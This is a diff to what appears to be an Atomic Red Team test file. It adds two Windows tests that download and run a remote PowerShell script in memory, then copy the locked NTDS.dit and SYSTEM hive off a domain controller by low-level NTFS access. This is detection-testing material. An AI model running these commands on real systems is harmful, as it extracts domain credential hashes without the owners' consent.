@@ -261,3 +261,58 @@ atomic_tests:
       diskshadow.exe /s #{filename}
     name: command_prompt
     elevation_required: true
+- name: Copy NTDS in low level NTFS acquisition via MFT parsing
+  description: |
+    This test is intended to be run on a domain Controller.
+
+    UnderlayCopy is a PowerShell utility for low-level NTFS acquisition and dumping protected, locked system artifacts (for example: SAM, SYSTEM, NTDS.dit, registry hives, and other files that are normally inaccessible while Windows is running).
+  supported_platforms:
+    - windows
+  input_arguments:
+    extract_path:
+      type: string
+      default: C:\Windows\Temp
+      description: Path for extracted NTDS.dit
+    script_url:
+      description: URL to UnderlayCopy script
+      type: url
+      default: https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR #{script_url} -UseBasicParsing)
+      Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile #{extract_path}\ntds.dit
+      Underlay-Copy -Mode MFT -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile #{extract_path}\SYSTEM_HIVE
+    name: powershell
+    elevation_required: true
+    cleanup_command: |
+      remove-item "#{extract_path}\ntds.dit" -force -erroraction silentlycontinue
+      remove-item "#{extract_path}\SYSTEM_HIVE" -force -erroraction silentlycontinue
+
+- name: Copy NTDS in low level NTFS acquisition via fsutil
+  description: |
+    This test is intended to be run on a domain Controller.
+
+    UnderlayCopy is a PowerShell utility for low-level NTFS acquisition and dumping protected, locked system artifacts (for example: SAM, SYSTEM, NTDS.dit, registry hives, and other files that are normally inaccessible while Windows is running).
+  supported_platforms:
+    - windows
+  input_arguments:
+    extract_path:
+      type: string
+      default: C:\Windows\Temp
+      description: Path for extracted NTDS.dit
+    script_url:
+      description: URL to UnderlayCopy script
+      type: url
+      default: https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR #{script_url} -UseBasicParsing)
+      Underlay-Copy -Mode Metadata -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile #{extract_path}\ntds.dit
+      Underlay-Copy -Mode Metadata -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile #{extract_path}\SYSTEM_HIVE
+    name: powershell
+    elevation_required: true
+    cleanup_command: |
+      remove-item "#{extract_path}\ntds.dit" -force -erroraction silentlycontinue
+      remove-item "#{extract_path}\SYSTEM_HIVE" -force -erroraction silentlycontinue
